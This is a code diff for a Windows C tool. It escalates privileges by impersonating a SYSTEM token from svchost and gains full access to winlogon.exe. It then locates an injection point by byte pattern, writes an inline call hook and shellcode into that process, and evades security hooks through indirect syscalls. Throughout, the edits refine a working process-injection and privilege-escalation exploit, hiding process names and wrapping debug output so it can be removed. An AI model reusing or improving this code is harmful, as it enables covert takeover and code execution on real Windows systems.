@@ -3,6 +3,9 @@
 #include <stdint.h>
 #include "syscalls.h"
 #include "nt.h"
+
+#define DEBUG
+
 typedef struct _SFParams {
     DWORD ParamNum;
     BOOL IsLegacy;
@@ -151,7 +154,9 @@ PVOID SW3_GetSyscallAddress(DWORD FunctionHash)
     {
         if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
         {
-            return SW3_SyscallList.Entries[i].SyscallAddress;
+            PVOID SyscallAddr = SW3_SyscallList.Entries[i].SyscallAddress;
+            memset(&SW3_SyscallList, 0, sizeof(SW3_SyscallList));
+            return SyscallAddr;
         }
     }
 
@@ -167,6 +172,7 @@ DWORD SW3_GetSyscallNumber(DWORD FunctionHash)
     {
         if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
         {
+            memset(&SW3_SyscallList, 0, sizeof(SW3_SyscallList));
             return i;
         }
     }
@@ -214,7 +220,7 @@ LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo) {
     return EXCEPTION_CONTINUE_SEARCH;
 }
 
-// 加强版动态堆栈欺骗 AdvDSS
+// Galaxy Gate - NextGen
 NTSTATUS SFNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength) {
     Params.param[1] = (DWORD_PTR)FileHandle; Params.param[2] = (DWORD_PTR)DesiredAccess; Params.param[3] = (DWORD_PTR)ObjectAttributes; Params.param[4] = (DWORD_PTR)IoStatusBlock; Params.param[5] = (DWORD_PTR)AllocationSize; Params.param[6] = (DWORD_PTR)FileAttributes; Params.param[7] = (DWORD_PTR)ShareAccess; Params.param[8] = (DWORD_PTR)CreateDisposition; Params.param[9] = (DWORD_PTR)CreateOptions; Params.param[10] = (DWORD_PTR)EaBuffer; Params.param[11] = (DWORD_PTR)EaLength; Params.ParamNum = 11; Params.FuncHash = 0x0BDDB5F9C; Params.IsLegacy = 0; *NullPointer = 1; TCHAR tempFileName[MAX_PATH];
     GetTempFileName(0, 0, 0, tempFileName);return 0;
@@ -224,7 +230,7 @@ NTSTATUS SFNtWriteFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRouti
     WritePrivateProfileString("StarFly", "Version", "2.0", "Version.ini"); return 0;
 } // WritePrivateProfileString -> NtWriteFile
 
-// 动态堆栈欺骗 DSS
+// Galaxy Gate - Legacy
 NTSTATUS SFNtAccessCheck(PSECURITY_DESCRIPTOR pSecurityDescriptor, HANDLE ClientToken, ACCESS_MASK DesiaredAccess, PGENERIC_MAPPING GenericMapping, PPRIVILEGE_SET PrivilegeSet, PULONG PrivilegeSetLength, PACCESS_MASK GrantedAccess, PBOOLEAN AccessStatus) { Params.param[1] = (DWORD_PTR)pSecurityDescriptor; Params.param[2] = (DWORD_PTR)ClientToken; Params.param[3] = (DWORD_PTR)DesiaredAccess; Params.param[4] = (DWORD_PTR)GenericMapping; Params.param[5] = (DWORD_PTR)PrivilegeSet; Params.param[6] = (DWORD_PTR)PrivilegeSetLength; Params.param[7] = (DWORD_PTR)GrantedAccess; Params.param[8] = (DWORD_PTR)AccessStatus; Params.ParamNum = 8; Params.FuncHash = 0x0429E3D77; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtWorkerFactoryWorkerReady(HANDLE WorkerFactoryHandle) { Params.param[1] = (DWORD_PTR)WorkerFactoryHandle; Params.ParamNum = 1; Params.FuncHash = 0x093BB77D7; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtAcceptConnectPort(PHANDLE ServerPortHandle, ULONG AlternativeReceivePortHandle, PPORT_MESSAGE ConnectionReply, BOOLEAN AcceptConnection, PPORT_SECTION_WRITE ServerSharedMemory, PPORT_SECTION_READ ClientSharedMemory) { Params.param[1] = (DWORD_PTR)ServerPortHandle; Params.param[2] = (DWORD_PTR)AlternativeReceivePortHandle; Params.param[3] = (DWORD_PTR)ConnectionReply; Params.param[4] = (DWORD_PTR)AcceptConnection; Params.param[5] = (DWORD_PTR)ServerSharedMemory; Params.param[6] = (DWORD_PTR)ClientSharedMemory; Params.ParamNum = 6; Params.FuncHash = 0x024B23D18; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
@@ -733,7 +739,7 @@ DWORD_PTR ConvertSvcNameToPid(wchar_t* SvcName) {
     SFNtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &returnLength);
     PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
     while (TRUE) {
-        if (pInfo->ImageName.Buffer && wcsstr(pInfo->ImageName.Buffer, L"vchost")) { // 即svchost.exe
+        if (pInfo->ImageName.Buffer && wcsstr(pInfo->ImageName.Buffer, L"svchost")) {
             HANDLE hProcess = 0;
             CLIENT_ID clientId = { pInfo->UniqueProcessId, 0 };
             OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr) };
@@ -771,14 +777,14 @@ void LocalPrivilege() {
     PVOID buffer = malloc(bufferSize);
     SFNtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
     PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
-    
+
     while (processInfo->NextEntryOffset) {
-        if (processInfo->ImageName.Buffer && wcsstr(processInfo->ImageName.Buffer, L"svchost")) {
-            OBJECT_ATTRIBUTES objectAttributes = {0};
-            CLIENT_ID clientId = {processInfo->UniqueProcessId, NULL};
+        if (processInfo->ImageName.Buffer && wcsstr(processInfo->ImageName.Buffer, L"vchos")) { // 即 svchost.exe
+            OBJECT_ATTRIBUTES objectAttributes = { 0 };
+            CLIENT_ID clientId = { processInfo->UniqueProcessId, NULL };
             HANDLE hTokenProcess = 0;
             SFNtOpenProcess(&hTokenProcess, PROCESS_QUERY_LIMITED_INFORMATION, &objectAttributes, &clientId);
-            
+
             if (hTokenProcess) {
                 HANDLE hToken = 0;
                 SFNtOpenProcessToken(hTokenProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken);
@@ -794,25 +800,19 @@ void LocalPrivilege() {
                     SID_NAME_USE userUse;
                     BOOL userLookupSuccess = LookupAccountSidW(NULL, tokenUser->User.Sid, userName, &userNameSize, userDomain, &userDomainSize, &userUse);
                     if (userLookupSuccess && wcscmp(userName, L"SYSTEM") == 0) {
-                        typedef BOOL (WINAPI *ImpersonateLoggedOnUserPtr)(HANDLE);
-                        ImpersonateLoggedOnUserPtr pImpersonateLoggedOnUser = NULL;
-                        HMODULE hKernelBase = LoadLibraryW(L"kernelbase.dll");
-                        pImpersonateLoggedOnUser = (ImpersonateLoggedOnUserPtr)GetProcAddress(hKernelBase, "ImpersonateLoggedOnUser");
-                    pImpersonateLoggedOnUser(hToken); // 该行代码非常不安全 可能触发用户模式Hook
-                    // 试图用底层函数模拟ImpersonateLoggedOnUser 在复制令牌时出现错误 模拟令牌生成但不可用
-                    // HANDLE hImpersonationToken = 0;
-                    // SECURITY_QUALITY_OF_SERVICE sqos = { sizeof(SECURITY_QUALITY_OF_SERVICE), 3, NULL, NULL }
-                    // OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES), NULL, NULL, NULL, NULL,  };
-                    // SFNtDuplicateToken(hToken, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &objAttr, FALSE, TokenImpersonation, &hImpersonationToken);
-                    // SFNtSetInformationThread((HANDLE)(LONG_PTR)-2, ThreadImpersonationToken, &hImpersonationToken, sizeof(HANDLE));
+                        HANDLE hImpersonationToken = 0;
+                        SECURITY_QUALITY_OF_SERVICE sqos = {sizeof(sqos), SecurityImpersonation, SECURITY_DYNAMIC_TRACKING, FALSE};
+                        OBJECT_ATTRIBUTES objAttr = {sizeof(objAttr), NULL, NULL, OBJ_KERNEL_HANDLE, NULL, &sqos};
+                        SFNtDuplicateToken(hToken, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &objAttr, FALSE, TokenImpersonation, &hImpersonationToken);
+                        SFNtSetInformationThread((HANDLE)(LONG_PTR)-2, ThreadImpersonationToken, &hImpersonationToken, sizeof(HANDLE));
+                        free(tokenUser);
+                        break;
+                    }
                     free(tokenUser);
-                    break;
                 }
-                free(tokenUser);
             }
         }
-    }
-    processInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)processInfo + processInfo->NextEntryOffset);
+        processInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)processInfo + processInfo->NextEntryOffset);
     }
     free(buffer);
 }
@@ -828,14 +828,6 @@ HANDLE ElevateHandle(IN HANDLE hProcess, IN ACCESS_MASK DesiredAccess, IN DWORD 
     return hHighPriv;
 }
 
-
-unsigned char shellcode_loader[] = {
-    0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
-    0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
-    0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
-    0xE0, 0x90
-};
-
 unsigned char shellcode[] = {
 0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
@@ -848,19 +840,32 @@ unsigned char shellcode[] = {
 0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
 };
 
-// 合并数组函数
-void ConcatArrays(unsigned char* result, const unsigned char* arr1, size_t arr1Size, const unsigned char* arr2, size_t arr2Size) {
-    for (size_t i = 0; i < arr1Size; ++i) {
-        result[i] = arr1[i];
-    }
-    for (size_t i = 0; i < arr2Size; ++i) {
-        result[arr1Size + i] = arr2[i];
-    }
-}
+const unsigned char pattern[] = { // 注入点特征码
+    0xf6, 0x43, 0x1c, 0x01,
+    0x0f, 0x85, 0x11, 0x8d, 0x03, 0x00,
+    0x48, 0x8b, 0x4e, 0x08, 
+    0xba, 0xff, 0xff, 0xff, 0xff,
+    0x48, 0xff, 0x15, 0x5e, 0xff, 0x07, 0x00,
+    0x0f, 0x1f, 0x44, 0x00, 0x00 // 注入点 5字节
+};
+const SIZE_T patternSize = sizeof(pattern);
+const SIZE_T injectionOffset = 26; // 0x0f1f440000 在特征码中的偏移
 
-// 生成 hook
-void GenerateHook(int64_t originalInstruction) {
-    *(uint64_t*)(shellcode_loader + 0x12) = originalInstruction;
+PVOID FindInjectionPoint(HANDLE hWinLogon, PVOID ImageBase) {
+    SIZE_T imageSize = 609 * 1024; // 609kB = 623,616 字节
+    unsigned char* buffer = (unsigned char*)malloc(imageSize);
+    SIZE_T bytesRead;
+    SFNtReadVirtualMemory(hWinLogon, ImageBase, buffer, imageSize, &bytesRead);
+    for (SIZE_T i = 0; i < bytesRead - patternSize; i++) {
+        if (memcmp(buffer + i, pattern, patternSize) == 0) {
+            PVOID HookAddress = (PVOID)((uintptr_t)ImageBase + i + injectionOffset);
+            free(buffer);
+            return HookAddress;
+        }
+    }
+
+    free(buffer);
+    return NULL; // 未找到
 }
 
 // https://github.com/lsecqt/ThreadlessInject-C-Implementation/
@@ -878,69 +883,65 @@ PVOID FindMemoryHole(HANDLE hProcess, PVOID referenceAddress, SIZE_T size) {
     return NULL;
 }
 
+PVOID GetProcessImageBase(HANDLE hProcess) {
+    PROCESS_BASIC_INFORMATION pbi;
+    SIZE_T returnLength;
+    SFNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);
+    PEB peb;
+    SFNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &returnLength);
+    return peb.ImageBaseAddress;
+}
+
 int main() {
-    // Step 1: 权限提升，获取 winlogon 的完全访问句柄
+    // Step 1: 权限提升 获取winlogon.exe的完全访问句柄
     AddVectoredExceptionHandler(1, ExceptionHandler);
-    DWORD_PTR WinLogonPid = ConvertProcNameToPid(L"inlog"); // 即Winlogon.exe
+    DWORD_PTR WinLogonPid = ConvertProcNameToPid(L"inlog"); // 即 winlogon.exe
+    #ifdef DEBUG
     printf("[+] WinLogon PID Found: %lu\n", (unsigned long)WinLogonPid);
+    #endif
     HANDLE hWinLogonLowPriv = 0;
     CLIENT_ID clientId = { (HANDLE)WinLogonPid, 0 };
     OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr) };
     SFNtOpenProcess(&hWinLogonLowPriv, PROCESS_QUERY_LIMITED_INFORMATION, &objAttr, &clientId);
     LocalPrivilege();
     HANDLE hWinLogon = ElevateHandle(hWinLogonLowPriv, PROCESS_ALL_ACCESS, OBJ_INHERIT);
+    // Step 2: 解析PEB 寻找注入点
+    PVOID ImageBase = GetProcessImageBase(hWinLogon); // 假设已有此函数
+    PVOID HookAddress = FindInjectionPoint(hWinLogon, ImageBase);
 
-    // Step 2: 获取 NtWaitForSingleObject 的地址
-    DWORD_PTR HookAddress = (DWORD_PTR)SW3_GetSyscallAddress(0x0E05EC0E2) + 2;
-    printf("[+] Hook Address: 0x%p\n", (void*)HookAddress);
-
-    // Step 3: 分配内存用于 payload
+    // Step 3: 寻找内存空洞 分配内存
     PVOID memoryHoleAddress = NULL;
-    SIZE_T payloadSize = sizeof(shellcode_loader) + sizeof(shellcode);
-    memoryHoleAddress = FindMemoryHole(hWinLogon, (PVOID)HookAddress, payloadSize);
-    if (memoryHoleAddress == NULL) {
-        printf("[ERROR] Failed to find memory hole near HookAddress\n");
-        return -1;
-    }
+    SIZE_T payloadSize = sizeof(shellcode);
+    memoryHoleAddress = FindMemoryHole(hWinLogon, HookAddress, payloadSize);
+    #ifdef DEBUG
     printf("[+] Memory allocated at: 0x%p\n", memoryHoleAddress);
+    #endif
 
-    // Step 4: 读取 HookAddress 处的原始指令
-    int64_t originalBytes = 0;
-    SIZE_T bytesRead = 0;
-    SFNtReadVirtualMemory(hWinLogon, (PVOID)HookAddress, &originalBytes, sizeof(int64_t), &bytesRead);
-    printf("[+] Original bytes at 0x%p: 0x%llx\n", (void*)HookAddress, originalBytes);
-
-    // Step 5: 生成 hook
-    GenerateHook(originalBytes);
-
-    // Step 6: 修改 HookAddress 的内存保护
-    SIZE_T regionSize = 8; // 修改 8 字节
+    // Step 4: 写入内联Hook
+    SIZE_T regionSize = 8;
     ULONG oldProtect = 0;
-    PVOID baseAddress = (PVOID)HookAddress; // 使用临时变量，避免修改 HookAddress
+    PVOID baseAddress = HookAddress;
     SFNtProtectVirtualMemory(hWinLogon, &baseAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+    #ifdef DEBUG
     printf("[+] Memory protection changed to RWX at 0x%p\n", (void*)baseAddress);
-
-    // Step 7: 写入跳转指令 (call)
-    int32_t callOffset = (int32_t)((DWORD_PTR)memoryHoleAddress - (HookAddress + 5));
+    #endif
+    int32_t callOffset = (int32_t)((DWORD_PTR)memoryHoleAddress - ((DWORD_PTR)HookAddress + 5));
     unsigned char callShellcode[] = { 0xE8, 0x00, 0x00, 0x00, 0x00 };
     *(int32_t*)(callShellcode + 1) = callOffset;
     SIZE_T bytesWritten = 0;
-    SFNtWriteVirtualMemory(hWinLogon, (PVOID)HookAddress, callShellcode, sizeof(callShellcode), &bytesWritten);
+    SFNtWriteVirtualMemory(hWinLogon, HookAddress, callShellcode, sizeof(callShellcode), &bytesWritten);
+    #ifdef DEBUG
     printf("[+] Call instruction written at 0x%p, pointing to 0x%p\n", (void*)HookAddress, memoryHoleAddress);
+    #endif
 
-    // Step 8: 写入 payload
-    printf("[+] payloadSize: %zu\n", payloadSize);
-    unsigned char* payload = (unsigned char*)malloc(payloadSize);
-    ConcatArrays(payload, shellcode_loader, sizeof(shellcode_loader), shellcode, sizeof(shellcode));
-    SFNtWriteVirtualMemory(hWinLogon, memoryHoleAddress, payload, payloadSize, &bytesWritten);
+    // Step 5: 写入 Shellcode
+    SFNtWriteVirtualMemory(hWinLogon, memoryHoleAddress, shellcode, sizeof(shellcode), &bytesWritten);
+    SFNtProtectVirtualMemory(hWinLogon, &memoryHoleAddress, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
+    SFNtProtectVirtualMemory(hWinLogon, &baseAddress, &regionSize, PAGE_EXECUTE_READ, &oldProtect); // 恢复内存保护
+    #ifdef DEBUG
     printf("[+] Payload written to 0x%p\n", memoryHoleAddress);
-    free(payload);
-
-    // Step 9: 修改 payload 内存保护为 RX
-    SFNtProtectVirtualMemory(hWinLogon, &memoryHoleAddress, &payloadSize, PAGE_EXECUTE_READ, &oldProtect);
-    printf("[+] Payload memory protection set to RX\n");
-
     printf("[+] Injection successful, waiting for NtWaitForSingleObject to trigger!\n");
     system("pause");
+    #endif
     return 0;
 }
